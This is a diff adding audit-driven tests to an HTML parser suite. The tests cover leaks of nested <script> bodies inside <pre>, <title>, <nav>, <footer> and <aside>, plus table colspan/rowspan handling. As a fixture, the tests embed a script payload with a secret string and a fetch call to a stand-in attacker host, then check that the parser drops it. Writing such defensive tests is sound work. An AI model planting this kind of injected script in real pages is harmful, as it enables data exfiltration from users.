@@ -590,3 +590,79 @@ describe("htmlParser — post-merge audit fixes (#1886)", () => {
     expect(joined).toContain("Frame: /private/path");
   });
 });
+
+// ─── GRD-003 nested-tag leak hardening (2026-07-07 audit, AUDIT-E1855-001) ────
+// `skipElement` (backing the <title>/<pre> metadata/preformatted skip and the boilerplate
+// <nav>/<footer>/<aside> drop) used a plain `indexOf("</" + tagName)` substring search with no
+// awareness of a nested <script>/<style>/<noscript> subtree. A raw-text body containing a literal
+// closing-tag-shaped substring for its OWN container (e.g. a JS string literal `"</pre>"` inside a
+// <script> nested in a <pre>) was mis-read as the container's real close tag, prematurely ending
+// the skip and leaking the remainder of the still-open <script> body as ordinary text.
+describe("htmlParser — nested-script leak hardening across skip paths (audit 2026-07-07)", () => {
+  const secret = "PRE-LEAKED-SECRET-ABC";
+  function nestedScriptPayload(closingTag: string): string {
+    return (
+      `<script>var s="</${closingTag}>";var secret="${secret}";` +
+      'fetch("http://attacker.example/y");</script>'
+    );
+  }
+
+  it("drops a <script> nested in <pre> even when its body contains a literal </pre> substring", () => {
+    const html = `<pre>code${nestedScriptPayload("pre")}tail</pre><p>After.</p>`;
+    const { text } = parseHtml(html);
+    expect(text).not.toContain(secret);
+    expect(text).not.toContain("attacker.example");
+    expect(text).not.toContain("<script");
+    expect(text).toContain("After.");
+  });
+
+  it("drops a <script> nested in <title> even when its body contains a literal </title> substring", () => {
+    const html =
+      `<html><head><title>Doc${nestedScriptPayload("title")}Tail</title></head>` +
+      "<body><p>Body.</p></body></html>";
+    const { text } = parseHtml(html);
+    expect(text).not.toContain(secret);
+    expect(text).not.toContain("attacker.example");
+    expect(text).not.toContain("<script");
+    expect(text).toContain("Body.");
+  });
+
+  it.each(["nav", "footer", "aside"] as const)(
+    "drops a <script> nested in <%s> even when its body contains the container's own literal closing-tag substring",
+    (tagName) => {
+      const html = `<${tagName}>boiler${nestedScriptPayload(tagName)}tail</${tagName}><p>Main.</p>`;
+      const { text } = parseHtml(html);
+      expect(text).not.toContain(secret);
+      expect(text).not.toContain("attacker.example");
+      expect(text).not.toContain("<script");
+      expect(text).toContain("Main.");
+    },
+  );
+});
+
+// ─── Table colspan/rowspan hardening (2026-07-07 audit, AUDIT-E1855-002) ──────
+// Header/row extraction was purely positional (no colspan/rowspan awareness), silently
+// misaligning headers from values for merged-cell tables.
+describe("htmlParser — table span hardening (audit 2026-07-07)", () => {
+  it("expands a colspan header so values stay aligned with their real column headers", () => {
+    const html =
+      '<table><tr><th colspan="2">Category</th><th>Other</th></tr>' +
+      "<tr><td>A</td><td>B</td><td>C</td></tr></table>";
+    const texts = blockTexts(html);
+    const row = texts.find((t) => t.startsWith("Table:"));
+    expect(row).toBeDefined();
+    expect(row).toBe("Table: Category=A | Category 2=B | Other=C");
+  });
+
+  it("emits HTML_TABLE_SPAN_UNSUPPORTED when a header cell uses rowspan > 1", () => {
+    const result = htmlParser.parse(
+      selectionFromText(
+        '<table><tr><th rowspan="2">Id</th><th>Value</th></tr>' +
+          "<tr><td>2</td></tr><tr><td>1</td><td>x</td></tr></table>",
+        { extension: "html" },
+      ),
+      buildParserOptions({ now: () => 0 }),
+    );
+    expect(result.diagnostics.map((d) => d.code)).toContain("HTML_TABLE_SPAN_UNSUPPORTED");
+  });
+});
